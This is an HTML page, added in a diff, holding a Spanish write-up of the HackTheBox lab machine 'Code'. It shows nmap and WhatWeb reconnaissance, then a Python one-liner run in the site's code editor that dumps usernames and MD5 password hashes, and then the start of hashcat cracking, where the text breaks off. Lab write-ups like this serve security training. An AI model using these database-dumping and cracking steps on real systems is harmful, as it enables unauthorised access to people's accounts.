@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code | Mi Potafolio De Pentesting</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #c9d1d9;  
+            font-family: 'Courier New', Courier, monospace;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 850px;
+            width: 100%;
+        }
+        header {
+            border-bottom: 2px solid #00ff41;
+            margin-bottom: 30px;
+            padding-bottom: 10px;
+        }
+        .back-link {
+            color: #00ff41;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+        h1 { color: #fff; margin: 10px 0; }
+        .meta { color: #888; font-size: 0.8em; margin-bottom: 20px; }
+        
+         
+        .content { background: #161b22; padding: 25px; border-radius: 5px; border: 1px solid #30363d; }
+        .content h2, .content h3 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 5px; }
+        
+         
+        pre {
+            background: #000;
+            padding: 15px;
+            border-left: 3px solid #00ff41;
+            overflow-x: auto;
+            color: #f8f8f2;
+        }
+        code { font-family: 'Consolas', monospace; color: #ff79c6; }
+        
+         
+        img { max-width: 100%; height: auto; border: 1px solid #00ff41; margin: 20px 0; }
+        
+        .tag { color: #0f0f0f; background: #00ff41; padding: 2px 8px; font-size: 0.7em; border-radius: 3px; margin-right: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="/" class="back-link">&lt; Volver al índice</a>
+            <h1>Code</h1>
+            <div class="meta">
+                <span>Fecha: 10/01/2026</span> | 
+                <span>Autor: Admin</span>
+            </div>
+            <div>
+                
+                <span class="tag">#Linux</span>
+                
+                <span class="tag">#SMB</span>
+                
+                <span class="tag">#Exploit-db</span>
+                
+            </div>
+        </header>
+
+        <article class="content">
+            <p>Esta es la maquina [[Code]] de [[HackTheBox]] en esta maquina lo que vamos a realizar es lo siguientes conceptos:</p>
+<h3 id="resumen-de-técnicas-usadas">Resumen de Técnicas Usadas</h3>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Técnica</strong></th>
+          <th><strong>Herramienta/Concepto</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Escaneo de Red y Enumeración</strong></td>
+          <td>[[Nmap]], [[WhatWeb]]</td>
+      </tr>
+      <tr>
+          <td><strong>Reconocimiento de Servicios</strong></td>
+          <td><strong>[[Nmap]] -sCV</strong>, [[Firefox]]</td>
+      </tr>
+      <tr>
+          <td><strong>RCE (Ejecución Remota de Código)</strong></td>
+          <td><strong>Explotación</strong> del <strong>[[Python]] Code Editor</strong></td>
+      </tr>
+      <tr>
+          <td><strong>Extracción y Cracking de Hashes</strong></td>
+          <td><strong>[[Hashcat]]</strong>, [[Hash MD5]] <strong>Cracking</strong></td>
+      </tr>
+      <tr>
+          <td><strong>Acceso SSH con Credenciales Robadas</strong></td>
+          <td><strong>[[SSH]] Login</strong></td>
+      </tr>
+      <tr>
+          <td><strong>Enumeración de Privilegios</strong></td>
+          <td><strong>sudo -l</strong>, <strong>lsb_release -a</strong></td>
+      </tr>
+      <tr>
+          <td><strong>Explotación de Tareas Programadas</strong></td>
+          <td><strong>backy.sh</strong> <strong>abuse</strong>  <strong>[[Bash]]</strong></td>
+      </tr>
+      <tr>
+          <td><strong>Escalada de Privilegios</strong></td>
+          <td><strong>Path Traversal, Tar Extraction</strong></td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<p>Para empezar por la maquina lo que primero realizamos es la creación de nuestro entorno de trabajo con los siguientes comandos :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdri Code
+</span></span><span style="display:flex;"><span>cd Code
+</span></span><span style="display:flex;"><span>mkt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Crea las siguientes Carpetas</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> which mkt
+</span></span><span style="display:flex;"><span>mkt <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	mkdir <span style="color:#f92672">{</span>nmap,content,exploits,scripts<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Después de crear nuestro entorno de trabajo lo que procedemos hacer es saber a que tipo de [[Sistema Operativo]] nos estamos enfrentando, ya sea [[Linux]] o [[Windows]], para saber esta información nos podríamos guiar por el [[TTL]] que nos da al realizar un [[Ping]] a la <strong>Maquina Victima</strong> aunque este se podría cambiar pero en [[HackTheBox]] no es el caso.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ ping <span style="color:#f92672">-</span>c <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">10.10.11.62</span>
+</span></span><span style="display:flex;"><span>PING <span style="color:#ae81ff">10.10.11.62</span> (<span style="color:#ae81ff">10.10.11.62</span>) <span style="color:#ae81ff">56</span>(<span style="color:#ae81ff">84</span>) bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from <span style="color:#ae81ff">10.10.11.62</span><span style="color:#f92672">:</span> icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">326</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> <span style="color:#ae81ff">10.10.11.62</span> ping statistics <span style="color:#f92672">---</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> packets transmitted, <span style="color:#ae81ff">1</span> received, <span style="color:#ae81ff">0</span>% packet loss, time <span style="color:#ae81ff">0</span>ms
+</span></span><span style="display:flex;"><span>rtt min<span style="color:#f92672">/</span>avg<span style="color:#f92672">/</span>max<span style="color:#f92672">/</span>mdev <span style="color:#f92672">=</span> <span style="color:#ae81ff">326.202</span><span style="color:#f92672">/</span><span style="color:#ae81ff">326.202</span><span style="color:#f92672">/</span><span style="color:#ae81ff">326.202</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0.000</span> ms
+</span></span></code></pre></div><p>Por lo que podemos ver el [[TTL]] de la <em>maquina</em> esta mas cerca de los <strong>64=[[Linux]]</strong> que los 128=[[Windows]]</p>
+<p>Pero esto después dentro de la maquina lo podremos comprobar <em>mejor</em> con <strong>lsb_release -a</strong>.</p>
+<p>Una vez creado el <strong>entorno de trabajo</strong> lo ahora empezaremos con la <strong>enumeración</strong> de con [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]]</p>
+<hr>
+<h2 id="uso-de--0-ciberseguridad1-herramientas-y-conceptosnmapnmapnmap">Uso de  [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]]</h2>
+<p>A continuación nos meteremos en la carpeta anteriormente creada llamada [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ cd nmap<span style="color:#f92672">/</span>
+</span></span></code></pre></div><p>Una vez dentro de la carpeta [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] empieza la <strong>enumeración</strong> para reconocer los [[Puerto]]s que están abiertos en el la <strong>Maquina Victima</strong> con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ nmap <span style="color:#f92672">-</span>p<span style="color:#f92672">-</span> <span style="color:#f92672">--</span>open <span style="color:#f92672">--</span>min<span style="color:#f92672">-</span>rate <span style="color:#ae81ff">5000</span> <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>vvv <span style="color:#f92672">-</span>n <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.11.62</span> <span style="color:#f92672">-</span>oG allPorts
+</span></span></code></pre></div><p>Una vez realizado el primer <strong>escaneo</strong> de la <strong>Maquina Victima</strong> lo que procedemos a hacer es la <em>extracción</em> de todos los puertos que nos proporciono dicho <strong>escaneo</strong>,.</p>
+<p>La <em>extracción</em> de los [[Puerto]]s que nos proporciono el primer comando lo haremos con una función que tenemos implementada en la [[zshrc]] llamada [[ExtractPorts]] la que hace lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>	│ File<span style="color:#f92672">:</span> extractPorts.tmp
+</span></span><span style="display:flex;"><span>	│ 
+</span></span><span style="display:flex;"><span>	│ [<span style="color:#f92672">*</span>] Extracting information...
+</span></span><span style="display:flex;"><span>	│ 
+</span></span><span style="display:flex;"><span>	│     [<span style="color:#f92672">*</span>] IP Address<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.62</span>
+</span></span><span style="display:flex;"><span>	│     [<span style="color:#f92672">*</span>] Open ports<span style="color:#f92672">:</span> <span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>	│ 
+</span></span><span style="display:flex;"><span>	│ [<span style="color:#f92672">*</span>] Ports copied to clipboard
+</span></span><span style="display:flex;"><span>	│ 
+</span></span></code></pre></div><p>Con lo que nos proporciono podremos ya realizar el siguiente <strong>escaneo</strong> con [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ nmap <span style="color:#f92672">-</span>p22,<span style="color:#ae81ff">5000</span> <span style="color:#f92672">-</span>sCV <span style="color:#ae81ff">10.10.11.62</span> <span style="color:#f92672">-</span>oN targeted
+</span></span></code></pre></div><p>Este <strong>[[Escaneo de Servicios]]</strong> nos proporciona una <strong>mejor</strong> descripción de los <strong>servicios</strong> que están corriendo en los [[Puerto]]s <strong>abiertos</strong>, con un <strong>cat</strong> podremos ver la <em>información</em> que nos proporciono este <strong>escaneo</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span> ❯ cat targeted <span style="color:#f92672">-</span>l java
+</span></span><span style="display:flex;"><span>	│ File<span style="color:#f92672">:</span> targeted
+</span></span><span style="display:flex;"><span>	│ <span style="color:#75715e"># Nmap 7.94SVN scan initiated Tue Apr  1 07:56:15 2025 as: nmap -p22,5000 -sCV -oN targeted 10.10.11.62</span>
+</span></span><span style="display:flex;"><span>	│ Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.11.62</span>
+</span></span><span style="display:flex;"><span>	│ Host is <span style="color:#a6e22e">up </span>(<span style="color:#ae81ff">0.34</span>s latency).
+</span></span><span style="display:flex;"><span>	│ 
+</span></span><span style="display:flex;"><span>	│ PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>	│ <span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp   open  ssh     OpenSSH <span style="color:#ae81ff">8.2</span>p1 Ubuntu <span style="color:#ae81ff">4</span><span style="color:#a6e22e">ubuntu0.12 </span>(Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
+</span></span><span style="display:flex;"><span>	│ <span style="color:#f92672">|</span> ssh<span style="color:#f92672">-</span>hostkey<span style="color:#f92672">:</span> 
+</span></span><span style="display:flex;"><span>	│ <span style="color:#f92672">|</span>   <span style="color:#ae81ff">3072</span> b5<span style="color:#f92672">:</span>b9<span style="color:#f92672">:</span><span style="color:#ae81ff">7</span>c<span style="color:#f92672">:</span>c4<span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#ae81ff">95</span><span style="color:#f92672">:</span>bc<span style="color:#f92672">:</span>c2<span style="color:#f92672">:</span><span style="color:#ae81ff">65</span><span style="color:#f92672">:</span><span style="color:#ae81ff">17</span><span style="color:#f92672">:</span>df<span style="color:#f92672">:</span><span style="color:#ae81ff">51</span><span style="color:#f92672">:</span>a2<span style="color:#f92672">:</span><span style="color:#ae81ff">7</span>a<span style="color:#f92672">:</span><span style="color:#a6e22e">bd </span>(RSA)
+</span></span><span style="display:flex;"><span>	│ <span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">94</span><span style="color:#f92672">:</span>b5<span style="color:#f92672">:</span><span style="color:#ae81ff">25</span><span style="color:#f92672">:</span><span style="color:#ae81ff">54</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span>b<span style="color:#f92672">:</span><span style="color:#ae81ff">68</span><span style="color:#f92672">:</span>af<span style="color:#f92672">:</span>be<span style="color:#f92672">:</span><span style="color:#ae81ff">40</span><span style="color:#f92672">:</span>e1<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>d<span style="color:#f92672">:</span>a8<span style="color:#f92672">:</span><span style="color:#ae81ff">6</span>b<span style="color:#f92672">:</span><span style="color:#ae81ff">85</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>d<span style="color:#f92672">:</span><span style="color:#ae81ff">01</span> (ECDSA)
+</span></span><span style="display:flex;"><span>	│ <span style="color:#f92672">|</span>_  <span style="color:#ae81ff">256</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>c<span style="color:#f92672">:</span>dc<span style="color:#f92672">:</span><span style="color:#ae81ff">97</span><span style="color:#f92672">:</span>ad<span style="color:#f92672">:</span><span style="color:#ae81ff">86</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span>b4<span style="color:#f92672">:</span><span style="color:#ae81ff">88</span><span style="color:#f92672">:</span>e2<span style="color:#f92672">:</span><span style="color:#ae81ff">29</span><span style="color:#f92672">:</span>cf<span style="color:#f92672">:</span><span style="color:#ae81ff">69</span><span style="color:#f92672">:</span>b5<span style="color:#f92672">:</span><span style="color:#ae81ff">65</span><span style="color:#f92672">:</span><span style="color:#ae81ff">96</span> (ED25519)
+</span></span><span style="display:flex;"><span>	│ <span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>tcp open  http    Gunicorn <span style="color:#ae81ff">20.0.4</span>
+</span></span><span style="display:flex;"><span>	│ <span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title<span style="color:#f92672">:</span> Python Code Editor
+</span></span><span style="display:flex;"><span>	│ <span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header<span style="color:#f92672">:</span> gunicorn<span style="color:#f92672">/</span><span style="color:#ae81ff">20.0.4</span>
+</span></span><span style="display:flex;"><span>	│ Service Info<span style="color:#f92672">:</span> OS<span style="color:#f92672">:</span> Linux; CPE<span style="color:#f92672">:</span> cpe<span style="color:#f92672">:/</span>o<span style="color:#f92672">:</span>linux<span style="color:#f92672">:</span>linux_kernel
+</span></span><span style="display:flex;"><span>	│ 
+</span></span><span style="display:flex;"><span>	│ Service detection performed. Please report any incorrect results at https<span style="color:#f92672">://</span>nmap.org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> .
+</span></span><span style="display:flex;"><span>	│ <span style="color:#75715e"># Nmap done at Tue Apr  1 07:56:34 2025 -- 1 IP address (1 host up) scanned in 20.01 seconds</span>
+</span></span></code></pre></div><p>Vemos que en esta <strong>Máquina</strong> esta abierto un [[Puerto]] el cual no sabemos cual es y que hace por lo que haremos a continuación es hacer una búsqueda de que es <strong>[[Gunicorn]]</strong>.</p>
+<hr>
+<h2 id="búsqueda-de-información-por-firefox">Búsqueda de Información Por [[Firefox]]</h2>
+<p>Con esto lo que podemos presenciar es un [[Servicio]] nuevo que nunca hemos visto antes que se llama [[Gunicorn]], por lo tanto realizaremos una búsqueda en [[Firefox]] sobre que es [[Gunicorn]] y saber que los posibles tipos de <strong>vulnerabilidad</strong> tiene.</p>
+<p>Resumen de lo que nos salio en el [[Firefox]]:</p>
+<ul>
+<li>
+<p>Que es [[Gunicorn]]?
+El [[Gunicorn]] &ldquo;Green Unicorn&rdquo; es un [[servidor]] [[HTTP]] de interfaz de puerta de enlace de [[servidor]] web [[Python]]. Es un modelo de trabajador previo a la bifurcación, adaptado del proyecto Unicorn de [[Ruby]].</p>
+</li>
+<li>
+<p><a href="mailto:gunicorn@20.0.4">gunicorn@20.0.4</a> vulnerabilities
+<a href="https://security.snyk.io/package/pip/gunicorn/20.0.4">https://security.snyk.io/package/pip/gunicorn/20.0.4</a></p>
+</li>
+</ul>
+<p>Lo que dice la pagina de Proporcionada es lo siguiente:</p>
+<p>En resumen, el texto describe dos vulnerabilidades relacionadas con <strong>[[Gunicorn]]</strong>, un servidor [[HTTP]] para aplicaciones [[Python]] en [[UNIX]].</p>
+<ol>
+<li>
+<p><strong>[[HTTP]] Request [[Smuggling]] ([[Smuggling]] de solicitudes [[HTTP]])</strong>: Las versiones vulnerables de [[Gunicorn]] no validan correctamente el encabezado <strong>Transfer-Encoding</strong>, lo que permite a un atacante manipular los datos de la sesión, envenenar cachés o comprometer la integridad de los datos. Esto se debe a un comportamiento incorrecto cuando <strong>Transfer-Encoding</strong> no se maneja correctamente y el servidor recurre al <strong>Content-Length</strong>. Se recomienda <strong>actualizar a la versión 23.0.0 o superior</strong> para corregir esto.</p>
+</li>
+<li>
+<p><strong>Comprobación Incorrecta de Condiciones Inusuales</strong>: Las versiones afectadas utilizan la función <strong>time.time()</strong> para gestionar los tiempos de espera de los trabajadores, lo cual es vulnerable si un atacante controla el reloj del sistema, ya que podría forzar un <strong>timeout</strong>. Esto se puede solucionar actualizando a <strong>la versión 21.2.0 o superior</strong>.</p>
+</li>
+</ol>
+<p><strong>Recomendación general</strong>: Se debe actualizar [[Gunicorn]] a versiones seguras (21.2.0 o superior para el segundo problema y 23.0.0 o superior para el primero) y, en el caso de [[HTTP]] Request Smuggling, proteger los puntos finales restringidos con un [[firewall]] hasta que se resuelva el problema.</p>
+<hr>
+<h2 id="uso-de-whatweb">Uso de [[WhatWeb]]</h2>
+<p>Para poder seguir enumerando podemos utilizar [[WhatWeb]] para saber los distintos servicios que puede ser que estén corriendo por detrás de la pagina web que esta creada y que no se vieron anteriormente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ whatweb <span style="color:#f92672">-</span>v http<span style="color:#f92672">://</span><span style="color:#ae81ff">10.10.11.62</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>WhatWeb report <span style="color:#66d9ef">for</span> http<span style="color:#f92672">://</span><span style="color:#ae81ff">10.10.11.62</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>Status    <span style="color:#f92672">:</span> <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Title     <span style="color:#f92672">:</span> Python Code Editor
+</span></span><span style="display:flex;"><span>IP        <span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.62</span>
+</span></span><span style="display:flex;"><span>Country   <span style="color:#f92672">:</span> RESERVED, ZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Summary   <span style="color:#f92672">:</span> HTML5, HTTPServer[gunicorn<span style="color:#f92672">/</span><span style="color:#ae81ff">20.0.4</span>], JQuery[3.6.0], Script
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Detected Plugins<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>[ HTML5 ]
+</span></span><span style="display:flex;"><span>	HTML version <span style="color:#ae81ff">5</span>, detected by the doctype declaration 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[ HTTPServer ]
+</span></span><span style="display:flex;"><span>	HTTP server header string. This plugin also attempts to 
+</span></span><span style="display:flex;"><span>	identify the operating system from the server header. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	String       <span style="color:#f92672">:</span> gunicorn<span style="color:#f92672">/</span><span style="color:#ae81ff">20.0.4</span> (from server string)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[ JQuery ]
+</span></span><span style="display:flex;"><span>	A fast, concise, JavaScript that simplifies how to traverse 
+</span></span><span style="display:flex;"><span>	HTML documents, handle events, perform animations, and add 
+</span></span><span style="display:flex;"><span>	AJAX. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Version      <span style="color:#f92672">:</span> <span style="color:#ae81ff">3.6.0</span>
+</span></span><span style="display:flex;"><span>	Website     <span style="color:#f92672">:</span> http<span style="color:#f92672">://</span>jquery.com<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[ Script ]
+</span></span><span style="display:flex;"><span>	This plugin detects instances of script HTML elements and 
+</span></span><span style="display:flex;"><span>	returns the script language<span style="color:#f92672">/</span>type. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP Headers<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>	Server<span style="color:#f92672">:</span> gunicorn<span style="color:#f92672">/</span><span style="color:#ae81ff">20.0.4</span>
+</span></span><span style="display:flex;"><span>	Date<span style="color:#f92672">:</span> Tue, <span style="color:#ae81ff">01</span> Apr <span style="color:#ae81ff">2025</span> <span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">52</span><span style="color:#f92672">:</span><span style="color:#ae81ff">16</span> GMT
+</span></span><span style="display:flex;"><span>	Connection<span style="color:#f92672">:</span> close
+</span></span><span style="display:flex;"><span>	Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">:</span> text<span style="color:#f92672">/</span>html; charset<span style="color:#f92672">=</span>utf<span style="color:#ae81ff">-8</span>
+</span></span><span style="display:flex;"><span>	Content<span style="color:#f92672">-</span>Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">3435</span>
+</span></span><span style="display:flex;"><span>	Vary<span style="color:#f92672">:</span> Cookie
+</span></span></code></pre></div><p>Con esto podemos ver mas al detalle lo que tiene la pagina web.</p>
+<hr>
+<h2 id="explotación-del-editor-de-el--python-code-editor">Explotación del Editor de el  [[Python]] Code Editor</h2>
+<p>En la [[URL]] del navegador [[Firefox]] ponemos la [[IP]] y el [[Puerto]] en el que esta alogado la pagina web del [[Python]] Code Editor:</p>
+<p><code>{r title:URL}http://10.10.11.62:5000/</code>
+`</p>
+<p>Una vez dentro de la <strong>pagina web</strong> lo que vemos es lo siguiente:
+![[Pasted image 20250401110604.png]]</p>
+<p>Con esto nos podemos plantear intentar hacer <strong>Código</strong> con este por si es <strong>vulnerable</strong>.</p>
+<p>Y uno que podemos hacer es un <strong>código</strong> que escriba los datos que tiene en la [[Databases]]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>print([(user<span style="color:#f92672">.</span>id, user<span style="color:#f92672">.</span>username, user<span style="color:#f92672">.</span>password) <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>all()])
+</span></span></code></pre></div><p>![[Pasted image 20250403080030.png]]</p>
+<p>Y podemos ver los datos y con ello podemos ver que que son <em>datos</em> que están <strong>encriptado</strong> y que podemos crear un <strong>.txt</strong> con las credenciales para tenerlas seguras en nuestro <strong>equipo</strong> .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ cat usuarios.txt <span style="color:#f92672">-</span>l java
+</span></span><span style="display:flex;"><span>	File<span style="color:#f92672">:</span> usuarios.txt
+</span></span><span style="display:flex;"><span>{␍
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;output&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;[(1, &#39;development&#39;, &#39;759b74ce43947f5f4c91aeddc3e5bad3&#39;), (2, &#39;martin&#39;, &#39;3de6f30c4a09c27fc71932bfc68474be&#39;)]\n&#34;</span>␍
+</span></span><span style="display:flex;"><span>}		
+</span></span></code></pre></div><hr>
+<h2 id="uso-de-hashcat">Uso de [[Hashcat]]</h2>
+<p>Ahora sabiendo que tenemos <strong>usuario potenciales</strong> para iniciar una sesión con [[SSH]] lo que haremos es usar [[Hashcat]] para desencriptar las <em>contraseñas</em> <strong>Hasheadas</strong>.</p>
+<p>Y el que nos interesa a nosotros es el Usuario de <strong>Martin</strong> y con el siguiente comando conseguiremos averiguar que tipo es el [[Hash]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>❯ hashcat <span style="color:#e6db74">&#34;3de6f30c4a09c27fc71932bfc68474be&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Texto que nos proporciona Hashcat</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The following <span style="color:#ae81ff">11</span> hash<span style="color:#f92672">-</span>modes match the structure of your input hash<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># | Name                                                       | Category</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">======+============================================================+======================================</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">900</span> <span style="color:#f92672">|</span> MD4                                                        <span style="color:#f92672">|</span> Raw Hash
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span> MD5                                                        <span style="color:#f92672">|</span> Raw Hash
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">70</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">utf16le</span>(<span style="color:#f92672">$</span>pass))                                        <span style="color:#f92672">|</span> Raw Hash
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2600</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#f92672">$</span>pass))                                            <span style="color:#f92672">|</span> Raw Hash salted and<span style="color:#f92672">/</span>or iterated
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3500</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#f92672">$</span>pass)))                                       <span style="color:#f92672">|</span> Raw Hash salted and<span style="color:#f92672">/</span>or iterated
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4400</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#f92672">$</span>pass))                                           <span style="color:#f92672">|</span> Raw Hash salted and<span style="color:#f92672">/</span>or iterated
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">20900</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">sha1</span>(<span style="color:#f92672">$</span>pass)<span style="color:#a6e22e">.md5</span>(<span style="color:#f92672">$</span>pass)<span style="color:#a6e22e">.sha1</span>(<span style="color:#f92672">$</span>pass))                    <span style="color:#f92672">|</span> Raw Hash salted and<span style="color:#f92672">/</span>or iterated
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4300</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">strtoupper</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#f92672">$</span>pass)))                                <span style="color:#f92672">|</span> Raw Hash salted and<span style="color:#f92672">/</span>or iterated
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1000</span> <span style="color:#f92672">|</span> NTLM                                                       <span style="color:#f92672">|</span> Operating System
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9900</span> <span style="color:#f92672">|</span> Radmin2                                                    <span style="color:#f92672">|</span> Operating System
